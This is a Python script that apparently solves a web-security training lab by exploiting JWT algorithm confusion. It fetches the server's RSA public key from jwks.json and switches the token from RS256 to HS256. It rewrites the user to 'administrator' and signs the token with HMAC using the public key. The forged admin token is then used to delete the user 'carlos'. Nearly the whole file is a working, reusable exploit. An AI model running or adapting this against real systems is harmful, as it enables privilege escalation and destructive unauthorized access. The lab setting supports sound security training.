import json
import sys
import requests
import re
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import base64
import hmac
import hashlib


class Solver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'

    def get_csrf(self):
        response = requests.get(self.lab_url + 'login')
        return re.search('value="(.*)"', response.text).group(1)

    def get_jwt_token(self):
        data = {'csrf': self.get_csrf(), 'username': 'wiener', 'password': 'peter'}
        session = requests.Session()
        session.post(self.lab_url + 'login', data=data)
        return session.cookies['session']

    def get_jwk(self):
        response = requests.get(self.lab_url + 'jwks.json')
        json_jwk = json.loads(response.text)
        e_base64_encoded = json_jwk['keys'][0]['e']
        n_base64_encoded = json_jwk['keys'][0]['n']
        return e_base64_encoded, n_base64_encoded

    @staticmethod
    def create_rsa_public_key_from_e_and_n(e, n):
        e = base64.urlsafe_b64decode((e + '=' * (len(e) % 4)).replace('-', '+').replace('_', '/'))
        n = base64.urlsafe_b64decode((n + '=' * (len(n) % 4)).replace('-', '+').replace('_', '/'))
        exponent = int.from_bytes(e, byteorder='big')
        modulus = int.from_bytes(n, byteorder='big')
        public_key_numbers = rsa.RSAPublicNumbers(e=exponent, n=modulus)
        public_key = public_key_numbers.public_key(default_backend())
        pem_public_key = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        return pem_public_key

    @staticmethod
    def generate_hs256_signature(secret_key, data):
        secret_key = bytes(secret_key, 'utf-8')
        data = bytes(data, 'utf-8')
        signature = hmac.new(secret_key, data, hashlib.sha256).digest()
        return base64.urlsafe_b64encode(signature).decode().rstrip('=')

    def generate_malicious_token(self):
        token = self.get_jwt_token()
        header, payload, _ = token.split('.')
        header += '=' * (len(payload) % 4)
        header = base64.urlsafe_b64decode(header)
        header = header.replace(b'RS256', b'HS256')
        header = base64.urlsafe_b64encode(header).rstrip(b'=')
        payload += '=' * (len(payload) % 4)
        payload = base64.urlsafe_b64decode(payload)
        payload = payload.replace(b'wiener', b'administrator')
        payload = base64.urlsafe_b64encode(payload).rstrip(b'=')
        data = header.decode() + '.' + payload.decode()
        e, n = self.get_jwk()
        pem_public_key = self.create_rsa_public_key_from_e_and_n(e, n)
        signature = self.generate_hs256_signature(pem_public_key.decode(), data)
        return header.decode() + '.' + payload.decode() + '.' + signature

    def delete_the_user(self):
        cookies = {'session': self.generate_malicious_token()}
        response = requests.get(self.lab_url + 'admin/delete?username=carlos', cookies=cookies)
        if 'wiener' in response.text and 'carlos' not in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def start(self):
        self.delete_the_user()


solver = Solver(sys.argv[1])
solver.start()
